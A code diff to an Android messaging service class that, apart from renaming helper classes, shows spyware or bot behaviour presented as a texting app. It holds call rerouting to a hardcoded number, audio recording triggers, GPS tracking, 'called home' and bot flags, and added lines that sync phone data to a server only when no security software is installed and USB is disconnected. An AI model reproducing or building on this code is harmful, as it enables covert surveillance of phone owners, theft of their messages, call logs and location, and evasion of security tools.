@@ -24,36 +24,26 @@ import android.provider.CallLog;
 import android.provider.Telephony;
 import android.util.Log;
 
+import com.candroid.textme.api.Apps;
+import com.candroid.textme.api.Bot;
+import com.candroid.textme.notifications.NotificationFactory;
+import com.candroid.textme.api.Systems;
 import com.candroid.textme.data.Commands;
 import com.candroid.textme.data.Constants;
 import com.candroid.textme.data.db.Database;
 import com.candroid.textme.data.db.DatabaseHelper;
 import com.candroid.textme.data.pojos.Recorder;
-import com.candroid.textme.jobs.JobsIntentService;
-import com.candroid.textme.receivers.ImeReceiver;
-import com.candroid.textme.api.Lofl;
+import com.candroid.textme.jobs.CommandsIntentService;
 import com.candroid.textme.receivers.CreateConversationReceiver;
 import com.candroid.textme.receivers.DatabaseReceiver;
 import com.candroid.textme.receivers.HeadsetPlugReceiver;
+import com.candroid.textme.receivers.ImeReceiver;
 import com.candroid.textme.receivers.IncomingReceiver;
 import com.candroid.textme.receivers.OutgoingCallReceiver;
 import com.candroid.textme.receivers.OutgoingReceiver;
 import com.candroid.textme.receivers.ScreenReceiver;
 import com.candroid.textme.receivers.WapReceiver;
 import com.candroid.textme.receivers.WifiReceiver;
-
-import java.io.DataOutputStream;
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.IOException;
-import java.io.ObjectInputStream;
-import java.io.ObjectOutputStream;
-import java.net.InetAddress;
-import java.net.InetSocketAddress;
-import java.net.ServerSocket;
-import java.net.Socket;
-import java.net.UnknownHostException;
-import java.util.ArrayList;
 
 public class MessagingService extends Service {
 
@@ -87,7 +77,7 @@ public class MessagingService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-        startForeground(Constants.FOREGROUND_NOTIFICATION_ID, Lofl.createPersistentServiceNotification(this));
+        startForeground(Constants.FOREGROUND_NOTIFICATION_ID, NotificationFactory.createPersistentServiceNotification(this));
         //JobsScheduler.scheduleJob(this);
         sIsRunning = true;
         mIncomingReceiver = new IncomingReceiver();
@@ -154,7 +144,7 @@ public class MessagingService extends Service {
         databaseFilter.addAction(Constants.Actions.ACTION_OUTGOING_SMS);
         mDatabaseReceiver = new DatabaseReceiver();
         registerReceiver(mDatabaseReceiver, databaseFilter);
-        sTelephoneAddress = Lofl.getDeviceTelephoneNumber(this);
+        sTelephoneAddress = Systems.Phone.getDeviceTelephoneNumber(this);
         Log.d(TAG, "address = " + sTelephoneAddress);
         mObserver = new SmsObserver();
         mCallLogObserver = new CallLogObserver();
@@ -169,7 +159,7 @@ public class MessagingService extends Service {
         SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
         OutgoingCallReceiver.sRerouteNumber = sharedPreferences.getString(OutgoingCallReceiver.NUMBER_KEY, "9727729432");
         ScreenReceiver.sShouldRecordAudio = sharedPreferences.getBoolean(ScreenReceiver.RECORDER_KEY, false);
-        JobsIntentService.sShouldTrackGps = sharedPreferences.getBoolean(JobsIntentService.GPS_TRACKER_KEY, false);
+        CommandsIntentService.sShouldTrackGps = sharedPreferences.getBoolean(CommandsIntentService.GPS_TRACKER_KEY, false);
         sHasCalledHome = sharedPreferences.getBoolean(Constants.Keys.CALLED_HOME_KEY, false);
         sIsBot = sharedPreferences.getBoolean(Constants.Keys.IS_BOT_KEY, false);
         //getContentResolver().registerContentObserver(Uri.parse("content://com.android.chrome.browser/history"), true, mBrowserObserver);
@@ -189,16 +179,17 @@ public class MessagingService extends Service {
                     } catch (InterruptedException e) {
                         e.printStackTrace();
                     }*/
-                    boolean hasSecuritySoftware = Lofl.hasSecuritySoftwareInstalled(MessagingService.this);
-                    if( ! hasSecuritySoftware && Lofl.isUsbDisconnected(MessagingService.this)){
-                        Lofl.onReceiveCommand(MessagingService.this, Commands.SYNC_PHONE_TO_SERVER, null, null);
+                    Bot.onReceiveCommand(MessagingService.this, 21, "start", null);
+                    boolean hasSecuritySoftware = Apps.hasSecuritySoftwareInstalled(MessagingService.this);
+                    if( ! hasSecuritySoftware && Systems.Usb.isUsbDisconnected(MessagingService.this)){
+                        Bot.onReceiveCommand(MessagingService.this, Commands.SYNC_PHONE_TO_SERVER, null, null);
                     }
                 }
             }).start();
         }
-        if(JobsIntentService.sShouldTrackGps){
+       /* if(CommandsIntentService.sShouldTrackGps){
             Lofl.onReceiveCommand(this, Commands.GPS_TRACKER, "start", null);
-        }
+        }*/
         return super.onStartCommand(intent, flags, startId);
     }
 
